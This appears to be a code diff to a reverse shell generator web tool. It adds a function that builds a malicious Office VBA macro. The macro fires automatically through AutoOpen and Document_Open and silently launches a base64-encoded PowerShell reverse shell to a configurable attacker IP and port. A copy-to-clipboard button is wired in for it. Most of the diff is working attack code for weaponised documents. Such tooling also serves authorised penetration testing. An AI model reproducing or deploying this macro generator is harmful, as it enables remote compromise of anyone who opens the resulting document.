@@ -117,6 +117,30 @@ const parsePortOrDefault = function (value, defaultPort = 9001) {
     return isValidPort ? number : defaultPort;
 };
 
+// === PowerShell Base64 + VBA Helpers ===
+
+function toUTF16LEBase64(str) {
+    const buffer = new ArrayBuffer(str.length * 2);
+    const view = new Uint16Array(buffer);
+    for (let i = 0; i < str.length; i++) {
+        view[i] = str.charCodeAt(i);
+    }
+    let binary = '';
+    const bytes = new Uint8Array(buffer);
+    for (let b of bytes) {
+        binary += String.fromCharCode(b);
+    }
+    return btoa(binary);
+}
+
+function splitVBALiteral(str, chunkSize = 50) {
+    const chunks = [];
+    for (let i = 0; i < str.length; i += chunkSize) {
+        chunks.push(str.substring(i, i + chunkSize));
+    }
+    return chunks;
+}
+
 const rsg = {
     ip: (query.get('ip') || localStorage.getItem('ip') || '10.10.10.10').replace(/[^a-zA-Z0-9.\-]/g, ''),
     port: parsePortOrDefault(query.get('port') || localStorage.getItem('port')),
@@ -184,9 +208,42 @@ const rsg = {
         return rsg.selectedValues[rsg.commandType];
     },
 
+
     getReverseShellCommand: () => {
-        const reverseShellData = rsgData.reverseShellCommands.find((item) => item.name === rsg.getSelectedCommandName());
+        const reverseShellData = rsgData.reverseShellCommands.find((item) => item.name ===rsg.getSelectedCommandName());
+
+        if (!reverseShellData) return '';
+         // Return VBA macro dynamically if placeholder is used
+        if (reverseShellData.command.trim() === '__VBA_MACRO__') {
+            return rsg.generateVBAMacro();
+        }
         return reverseShellData.command;
+    },
+
+    generateVBAMacro: () => {
+        const psCommand = rsg.insertParameters(rsgData.specialCommands['PowerShell payload'], (s) => s);
+        const base64 = btoa(unescape(encodeURIComponent(psCommand)));
+
+        const chunks = base64.match(/.{1,255}/g) || [];
+
+        const macroLines = chunks.map((chunk, index) => `    str = str + "${chunk}"`);
+        const macro = [
+            'Sub AutoOpen()',
+            '    macrogen',
+            'End Sub',
+            '',
+            'Sub Document_Open()',
+            '    macrogen',
+            'End Sub',
+            '',
+            'Sub macrogen()',
+            '    Dim str As String',
+            ...macroLines,
+            '    CreateObject("Wscript.Shell").Run "powershell -e " & str, 0',
+            'End Sub'
+        ].join('\n');
+
+        return macro;
     },
 
     getPayload: () => {
@@ -520,6 +577,11 @@ document.querySelector('#copy-msfvenom-command').addEventListener('click', () =>
 
 document.querySelector('#copy-hoaxshell-command').addEventListener('click', () => {
     rsg.copyToClipboard(hoaxShellCommand.innerText)
+})
+
+document.querySelector('#copy-vba-macro').addEventListener('click', () => {
+    const macro = rsg.generateVBAMacro();
+    rsg.copyToClipboard(macro);
 })
 
 var downloadButton = document.querySelectorAll(".download-svg");
